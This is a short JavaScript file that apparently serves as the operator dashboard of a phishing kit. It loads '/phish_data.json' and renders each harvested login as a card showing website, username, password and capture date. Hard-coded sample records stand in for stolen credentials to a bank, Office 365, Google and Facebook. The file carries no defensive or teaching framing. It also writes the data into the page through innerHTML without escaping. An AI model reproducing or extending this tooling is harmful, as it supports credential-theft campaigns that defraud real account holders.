let login_data = [
	{
		user_id: "WEWERFKSAF-JFFKKSA-FZHDSKWE-JYEIRLKWQ",
		user_name: "ashish",
		pass_word: "ashish@!2#4%",
		website: "https://icicibank.com"
	},
	{
		user_id: "ASLKHFKSAF-FKKLSA-SHSDSKWE-WYEIRLKWQ",
		user_name: "harry",
		pass_word: "harry@!2#4%",
		website: "https://office365.com"		
	},
	{
		user_id: "ASLKHFKSAF-FKKLSA-SHSDSKWE-WYEIRLKWQ",
		user_name: "manoj",
		pass_word: "manoj@!2#4%",
		website: "https://google.com"
	},
	{
		user_id: "ASLKHFKSAF-FKKLSA-SHSDSKWE-WYEIRLKWQ",
		user_name: "man",
		pass_word: "man@!2#4%",
		website: "https://facebook.com"		
	},
	{
		user_id: "WEWERFKSAF-JFFKKSA-FZHDSKWE-JYEIRLKWQ",
		user_name: "ashish",
		pass_word: "ashish@!2#4%",
		website: "https://icicibank.com"
	},
	{
		user_id: "ASLKHFKSAF-FKKLSA-SHSDSKWE-WYEIRLKWQ",
		user_name: "harry",
		pass_word: "harry@!2#4%",
		website: "https://office365.com"
	},
	{
		user_id: "ASLKHFKSAF-FKKLSA-SHSDSKWE-WYEIRLKWQ",
		user_name: "manoj",
		pass_word: "manoj@!2#4%",
		website: "https://google.com"
	},
	{
		user_id: "ASLKHFKSAF-FKKLSA-SHSDSKWE-WYEIRLKWQ",
		user_name: "man",
		pass_word: "man@!2#4%",
		website: "https://facebook.com"
	}

]


function create_login_card(one_login_data) {

	let login_card = `

	<div class="card mb-4 shadow" style="border-radius: 6px">
		<div class="card-body ">
			<table class="table table-bordered table-no-dark" style="font-size: 18px; font-weight: 500; border-radius: 10px!important;">
				<tbody>
					<tr>
						<td>Website Name:</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.website}</span>
						</td>
					</tr>
					<tr>
						<td>Username:</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.user_name}</span>
						</td>
					</tr>
					<tr>
						<td>Password:</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.pass_word}</span>
						</td>
					</tr>
					<tr>
						<td>Date Captured:</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.date}</span>
						</td>
					</tr>
				</tbody>
			</table>
			<a href="#" class="card-link">More Info</a>
			<a href="#" class="card-link">Login Details</a>
		</div>
	</div>
	
	`;
	return login_card;
}

function populate_login_cards(login_data) {
	let login_data_holder = document.querySelector(".login-data-holder");
	login_data_holder.innerHTML = "";
	for (one_login_data of login_data) {
		login_data_holder.innerHTML += create_login_card(one_login_data);
	}
}


fetch("/phish_data.json")
  .then(response => response.json())
  .then(responseData => {
	  responseData.reverse();
	  populate_login_cards(responseData);
})

